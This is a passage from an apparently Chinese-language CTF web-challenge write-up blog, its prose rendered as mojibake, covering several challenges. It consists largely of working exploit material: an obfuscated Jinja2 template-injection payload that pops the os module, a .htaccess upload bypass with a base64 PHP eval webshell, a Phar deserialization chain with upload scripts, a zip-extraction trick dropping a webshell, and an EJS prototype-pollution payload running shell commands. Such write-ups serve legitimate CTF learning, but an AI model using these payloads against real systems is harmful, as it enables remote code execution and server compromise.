125;&#123;%25set%0dcm&#x3D;config|join|truncate(81)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcn&#x3D;config|join|truncate(5)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dco&#x3D;config|join|truncate(21)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcp&#x3D;config|join|truncate(19)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcq&#x3D;config|join|truncate(294)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcr&#x3D;config|join|truncate(20)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcs&#x3D;config|join|truncate(14)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dct&#x3D;config|join|truncate(12)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcu&#x3D;config|join|truncate(10)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcv&#x3D;config|join|truncate(6)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcx&#x3D;config|join|truncate(30)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcy&#x3D;config|join|truncate(77)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcz&#x3D;config|join|truncate(533)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dglo&#x3D;cxhx%2Bcxhx%2Bcg%2Bcl%2Bco%2Bcb%2Bca%2Bcl%2Bcs%2Bcxhx%2Bcxhx%25&#125;&#123;%25set%0dcla&#x3D;cxhx%2Bcxhx%2Bcc%2Bcl%2Bca%2Bcs%2Bcs%2Bcxhx%2Bcxhx%25&#125;&#123;%25set%0dooo&#x3D;lipsum|attr(glo)|attr(cp%2Bco%2Bcp)(co%2Bcs)%25&#125;&#123;%25set%0da1&#x3D;config|string|truncate(300)|replace(point,wu)|list%25&#125;&#123;&#123;a1|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a1|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;%25set%0dgang&#x3D;a1|attr(cp%2Bco%2Bcp)()%25&#125;&#123;%25set%0da2&#x3D;config|list|string|truncate(20)|replace(point,wu)|list%25&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;&#123;a2|attr(cp%2Bco%2Bcp)()&#125;&#125;&#123;%25set%0dspace&#x3D;a2|attr(cp%2Bco%2Bcp)()%25&#125;&#123;&#123;ooo|attr(cp%2Bco%2Bcp%2Bce%2Bcn)(cc%2Bca%2Bct%2Bspace%2Bgang%2Bcf%2Bcl%2Bca%2Bcg)|attr(cr%2Bce%2Bca%2Bcd)()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>bançš„çœŸå¤š////////////</p><p>ä¸€ä¸ªè·å–æ‰€æœ‰å­—æ¯çš„å°è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token operator">=</span><span class="token string">"ENVDEBUGTESTINGPROPAGATE_EXCEPTIONSPRESERVE_CONTEXT_ON_EXCEPTIONSECRET_KEYPERMANENT_SESSION_LIFETIMEUSE_X_SENDFILESERVER_NAMEAPPLICATION_ROOTSESSION_COOKIE_NAMESESSION_COOKIE_DOMAINSESSION_COOKIE_PATHSESSION_COOKIE_HTTPONLYSESSION_COOKIE_SECURESESSION_COOKIE_SAMESITESESSION_REFRESH_EACH_REQUESTMAX_CONTENT_LENGTHSEND_FILE_MAX_AGE_DEFAULTTRAP_BAD_REQUEST_ERRORSTRAP_HTTP_EXCEPTIONSEXPLAIN_TEMPLATE_LOADINGPREFERRED_URL_SCHEMEJSON_AS_ASCIIJSON_SORT_KEYSJSONIFY_PRETTYPRINT_REGULARJSONIFY_MIMETYPETEMPLATES_AUTO_RELOADMAX_COOKIE_SIZE"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz"</span><span class="token punctuation">:</span>    kkk<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span>j<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            ini<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">4</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"å­—ç¬¦</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">ï¼šset%0dc</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">=config|join|truncate(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ini<span class="token punctuation">&#125;</span></span><span class="token string">)|replace(point,wu)|last|lower"</span></span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨åšå‡ºçš„å­—ç¬¦å˜é‡æ‹¼æ¥ä½¿ç”¨ï¼Œåå¤ä½¿ç”¨popç›´åˆ°æ‹¿åˆ°è‡ªå·±æƒ³è¦çš„å­—ç¬¦ï¼Œæœ€åå°†osæ¨¡å—popå‡ºè¿›è¡Œä½¿ç”¨ï¼ˆè¿™ä¹Ÿå¯¼è‡´äº†è¿™ä¸ªpayloadåªèƒ½ä¸€æ¬¡æ€§ä½¿ç”¨ï¼Œä½¿ç”¨ä¸€æ¬¡ç ´åä¸€æ¬¡ç¯å¢ƒï¼‰</p><h2 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h2><p>.htaccessè§£ææ¼æ´</p><p>å…ˆæ„é€ htaccessæ–‡ä»¶å†…å®¹</p><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸Šä¼ å›¾ç‰‡å‘ç°ç¡®å®è¢«ä»¥phpæ–‡ä»¶è§£æäº†ï¼Œè€Œåå°è¯•æ„é€ å›¾ç‰‡é©¬ï¼Œæœ€ç»ˆå‘ç°<code>&lt;?</code>è¢«è¿‡æ»¤ï¼Œå°è¯•å„ç§æ ‡ç­¾ï¼ˆphp7ä¸æ”¯æŒï¼‰ç»•è¿‡æ— æœï¼Œ00%æˆªæ–­æ— æœï¼ŒæŸ¥è¯¢å¾—çŸ¥htaccessä¹Ÿæœ‰ç±»ä¼¼.user.iniçš„æ–‡ä»¶åŒ…å«åŠŸèƒ½<code>php_value auto_append_file  &quot;æ–‡ä»¶å&quot;</code>ç›¸å½“äºæ‰§è¡Œ<code>include(&quot;æ–‡ä»¶å&quot;)</code>æ­¤å¤„å¯ä½¿ç”¨PHPè¿‡æ»¤å™¨ï¼Œæ‰€ä»¥å¯ä»¥å…ˆæ„é€ aæ–‡ä»¶åŒ…å«base64ç¼–ç åçš„æœ¨é©¬ï¼Œè€Œåå†ä½¿ç”¨è¿‡æ»¤å™¨è§£ç åŒ…å«æ‰§è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;1.pngPD9waHAgZXZhbCgkX1BPU1RbJ2trayddKTs&#x2F;Pg&#x3D;&#x3D;&#x2F;&#x2F;.htaccessAddType application&#x2F;x-httpd-php .pngphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;1.png&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶å†ä¸Šä¼ ä»»æ„pngå¹¶è®¿é—®å³å¯æ‰§è¡Œå›¾ç‰‡é©¬ï¼ˆå±…ç„¶è¿˜banç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼‰</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011424854.png"></p><p><strong>åé¢å°±æ˜¯è·Ÿç€å„ä½å¤§ä½¬WPåšå‡ºæ¥å¹¶ä¸”å­¦ä¹ åˆ°çš„æ–°çŸ¥è¯†å•¦</strong></p><h2 id="PharPOP"><a href="#PharPOP" class="headerlink" title="PharPOP"></a>PharPOP</h2><p>è¿›å»ä¹‹åé¦–å…ˆå‘ç°ä¼ ä¸è¿›å»ä¸œè¥¿ï¼Œç”±äºErrorçš„å­˜åœ¨ç›´æ¥ä¼ å…¥æ— æ³•è°ƒç”¨<code>__destruct</code>æ–¹æ³•ä¹Ÿå°±ä¸èƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œçœ‹äº†å¤§ä½¬wpå‘ç°æ˜¯é€šè¿‡æ„é€ å’Œååºåˆ—åŒ–å­—ç¬¦ä¸²ä¸ç›¸ç­‰çš„å˜é‡å£°æ˜æ•°é‡æ¥å¯¼è‡´ååºåˆ—åŒ–è¿‡ç¨‹æŠ¥é”™ï¼Œä½¿å¾—å†…å®¹è¢«é”€æ¯æ‰§è¡Œ<code>__destruct</code>æ–¹æ³•</p><p>ä¸‹ä¸€æ­¥å°±æ˜¯æ„é€ ååºåˆ—åŒ–é“¾äº†ï¼Œæœ€ç»ˆåˆ©ç”¨åˆ°çš„æ˜¯airä¸­çš„<code>__set</code>æ–¹æ³•åˆ©ç”¨PHPåŸç”Ÿç±»è¯»æ–‡ä»¶</p><blockquote><p>è¦è§¦å‘airç±»çš„<code>__set</code>é­”æœ¯æ–¹æ³•ï¼Œéœ€è¦ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼ï¼Œappleç±»ä¸­<code>__get</code>æœ‰èµ‹å€¼ ï¼Œè§¦å‘<code>__get</code>éœ€è¦è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼ï¼Œéœ€è¦è§¦å‘treeä¸­<code>__call</code>ï¼Œ<code>__call</code>æ˜¯è¦è°ƒç”¨å†…éƒ¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œtreeä¸­<code>__destruct</code>æ–¹æ³•å†…return $this-&gt;name();ã€‚</p><p>å†å›åˆ°airç±»ï¼Œæˆ‘ä»¬éœ€è¦p(value)ï¼Œpä¸ºDirectoryIteratorï¼Œvalueä¸ºglob://xxxxï¼Œåˆå› ä¸ºapple-getè§¦å‘air-setï¼Œæ‰€ä»¥apple-flagçš„å€¼ä¼šä¼ ç»™ valueï¼Œæ‰€ä»¥è®©<code>apple -&gt;flag=â€˜glob://xxxâ€™</code> å¯¹äº$pï¼Œair-getä¸­$p=nanaä¸­ä¸å­˜åœ¨actå±æ€§ï¼Œ<code>_Ì²_get</code>è¢«è§¦å‘ï¼Œè¿”å›actï¼Œâ€¦pä¸ºactï¼Œæ‰€ä»¥è®©act=DirectoryIteratorã€‚</p><p>å›åˆ°æœ€å¤–å±‚çš„treeï¼Œè¦è§¦å‘<code>__destruct</code>æ–¹æ³•éœ€è¦åˆ©ç”¨phpGCæœºåˆ¶</p><p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/weixin_46081055/article/details/125046554">https://blog.csdn.net/weixin_46081055/article/details/125046554</a></p></blockquote><p>æœ€ç»ˆæ„é€ çš„expå¦‚ä¸‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">air</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">tree</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$act</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">apple</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$xxx</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">banana</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token variable">$air</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">air</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tree</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$bana</span> <span class="token operator">=</span><span class="token keyword">new</span>  <span class="token class-name">banana</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$apple</span> <span class="token operator">-></span><span class="token property">flag</span><span class="token operator">=</span><span class="token string single-quoted-string">'glob:///f*'</span><span class="token punctuation">;</span><span class="token variable">$apple</span> <span class="token operator">-></span><span class="token property">xxx</span><span class="token operator">=</span> <span class="token variable">$air</span> <span class="token punctuation">;</span><span class="token variable">$air</span><span class="token operator">-></span><span class="token property">p</span><span class="token operator">=</span><span class="token variable">$bana</span><span class="token punctuation">;</span><span class="token variable">$bana</span><span class="token operator">-></span><span class="token property">act</span><span class="token operator">=</span><span class="token string double-quoted-string">"DirectoryIterator"</span><span class="token punctuation">;</span><span class="token variable">$tree</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span> <span class="token variable">$apple</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar1.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸ºphar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">=></span><span class="token variable">$tree</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">=></span><span class="token constant">NULL</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è¿™é‡Œæˆ‘ä»¬è¦ä¿®æ”¹ä¸€ä¸‹ç”Ÿæˆçš„pharæ–‡ä»¶ï¼Œè§¦å‘phpçš„åƒåœ¾å›æ”¶æœºåˆ¶æ¥è®©treeçš„<code>__destruct</code>æ–¹æ³•æ‰§è¡Œ</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311902654.png"></p><p>å°†æ­¤å¤„çš„1ä¿®æ”¹ä¸º0</p><p>å› ä¸º<strong>ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯é¡ºåºæ‰§è¡Œ</strong>çš„ï¼Œæ‰€ä»¥åˆ°ç¬¬ä¸€ä¸ªå±æ€§æ—¶ï¼Œä¼šå°†<code>Array[0]</code>è®¾ç½®ä¸º<code>tree</code>å¯¹è±¡ï¼ŒåŒæ—¶æˆ‘ä»¬åˆå°†<code>Array[0]</code>è®¾ç½®ä¸º<code>null</code>ï¼Œè¿™æ ·å‰é¢çš„<code>tree</code>å¯¹è±¡ä¾¿ä¸¢å¤±äº†å¼•ç”¨ï¼Œå°±ä¼šè¢«GCæ‰€æ•è·ï¼Œå°±å¯ä»¥æ‰§è¡Œ<code>__destruct</code>äº†ã€‚</p><p>æ­¤æ—¶ç”±äºpharæ–‡ä»¶è¢«ä¿®æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®å¤ä¸€ä¸‹æ–‡ä»¶ç­¾åï¼Œpythonè„šæœ¬å¦‚ä¸‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha1f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./phar1.phar'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># ä¿®æ”¹å†…å®¹åçš„pharæ–‡ä»¶</span>s <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token comment"># è·å–è¦ç­¾åçš„æ•°æ®</span>h <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token comment"># è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†</span>newf <span class="token operator">=</span> s<span class="token operator">+</span>sha1<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>h <span class="token comment"># æ•°æ® + ç­¾å + ç±»å‹ + GBMB</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'phar2.phar'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>newf<span class="token punctuation">)</span> <span class="token comment"># å†™å…¥æ–°æ–‡ä»¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸‹ä¸€æ­¥å°±æ˜¯è¦å°†æ–‡ä»¶ä¸Šä¼ ä¸Šå»äº†ï¼Œè¿™é‡Œç”¨pythonè„šæœ¬æ¥å°†å†…å®¹ä¸Šä¼ </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> gzip<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://602ad6c4-4397-47e9-a1ea-d957fe9c0e7c.node4.buuoj.cn:81/'</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./phar2.phar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token comment">#æ‰“å¼€æ–‡ä»¶</span>file_out <span class="token operator">=</span> gzip<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./phar.zip"</span><span class="token punctuation">,</span> <span class="token string">"wb+"</span><span class="token punctuation">)</span><span class="token comment">#åˆ›å»ºå‹ç¼©æ–‡ä»¶å¯¹è±¡ï¼Œå› ä¸ºä¸å‹ç¼©è¿‡ä¸äº†WAF</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_out<span class="token punctuation">)</span>file_out<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>file_out<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">'O:1:"D":2:&#123;s:5:"start";s:1:"w";&#125;'</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./phar.zip'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># file_get_contentsè§¦å‘pharååºåˆ—åŒ–</span>res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">'O:1:"D":2:&#123;s:5:"start";s:1:"r";&#125;'</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'phar:///tmp/6e1fdc42161a607b4fcdec2222a38881.jpg'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311910669.png"></p><h2 id="ezip"><a href="#ezip" class="headerlink" title="ezip"></a>ezip</h2><p>é¦–å…ˆæ˜¯ä¸ªzipåˆ©ç”¨çš„<a href="https://ucasers.cn/zip%E5%9C%A8CTF-web%E6%96%B9%E5%90%91%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E6%B3%95/">å¤§ä½¬æ€»ç»“</a>ï¼Œè¿™é‡Œè¦åˆ©ç”¨çš„æ˜¯è¿™ä¸ª</p><blockquote><p>è¿™é‡Œæ ¹æ®zipé‡Œé¢å‹ç¼©ç€çš„æ–‡ä»¶ä¸€ä¸ªä¸ªè§£å‹ï¼Œåªè¦æ‰§è¡Œè¿‡<code>php_zip_extract_file</code>å‡½æ•°ï¼Œç›¸åº”çš„æ–‡ä»¶å¤¹ä¹‹ä¸‹å°±ä¼šå‡ºç°é‚£ä¸ªå¯¹åº”çš„æ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœzipåŒ…é‡Œé¢ç¬¬ä¸€ä¸ªæ–‡ä»¶èƒ½è¢«è§£å‹ä½†æ˜¯ç¬¬äºŒä¸ªæ–‡ä»¶æœ‰é”™è¯¯çš„è¯ï¼Œæ•´ä¸ªå‘½ä»¤çš„çš„æ‰§è¡Œä¼šæŠ¥é”™ä½†ç¬¬ä¸€ä¸ªæ–‡ä»¶åœ¨æŠ¥é”™å‰å·²ç»è¢«å†™ä¸‹æ¥äº†ã€‚</p><p>é‡Œé¢æœ‰ä¸€ä¸ªå…³äºphpè§£å‹æ¼æ´çš„ï¼Œå¦‚æœå‹ç¼©åŒ…å…¶ä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶åå·¨é•¿ï¼Œå°±ä¼šæŠ¥é”™ï¼Œä½†æ˜¯é‡Œé¢çš„æœ¨é©¬å·²ç»è¢«è§£å‹äº†ã€‚æ‰€ä»¥ç›´æ¥æ‹¿é‚£ä¸ªè„šæœ¬è¿›è¡Œä¸€æ³¢è·‘ï¼š</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> io mf <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>mf<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">"w"</span><span class="token punctuation">,</span> compression<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZIP_STORED<span class="token punctuation">)</span> <span class="token keyword">as</span> zf<span class="token punctuation">:</span>    zf<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span> <span class="token string">b'@&lt;?php eval($_POST[1])?>'</span><span class="token punctuation">)</span>    zf<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">5000</span><span class="token punctuation">,</span> <span class="token string">b'AAAAA'</span><span class="token punctuation">)</span> <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"shell.zip"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>mf<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°è¯•è¯»å–flagå‘ç°æ²¡æœ‰æƒé™ï¼Œwhoamiä¹‹åå‘ç°ç”¨æˆ·ä¸ºwww-dataï¼Œ<a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">suidææƒ</a>ï¼Œnlå‘½ä»¤èµ°</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311941868.png"></p><p>æåˆ°flag</p><h2 id="NodeSoEasy"><a href="#NodeSoEasy" class="headerlink" title="NodeSoEasy"></a>NodeSoEasy</h2><p>é¢˜ç›®ä¸­ç»™äº†æºç ï¼Œä¹Ÿç»™äº†æ‰€ä½¿ç”¨æ¡†æ¶çš„ç‰ˆæœ¬å·ï¼Œéå¸¸æ˜æ˜¾çš„åŸå‹é“¾æ±¡æŸ“ï¼Œä½†æ˜¯åœ¨ejs 3.1.7ä¸­å·²ç»å°†<code>outputFunctionName</code>çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´ä¿®å¤äº†<del>æ‰€ä»¥æˆ‘ç”¨è¿™ä¸ªé“¾å­å¹²äº†åŠå¤©ä¹Ÿæ²¡ç»“æœ</del>ï¼Œçœ‹wpåˆ©ç”¨çš„æ˜¯å¦ä¸€ä¸ªé“¾å­<code>escapeFunction</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"client"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string-property property">"escapeFunction"</span><span class="token operator">:</span><span class="token string">"1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');"</span><span class="token punctuation">,</span><span class="token string-property property">"compileDebug"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205312011891.png"></p><h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><p>pickleååºåˆ—åŒ–æï¼Œè‡ªå·±æ„é€ è„šæœ¬å’¯</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">import base64import 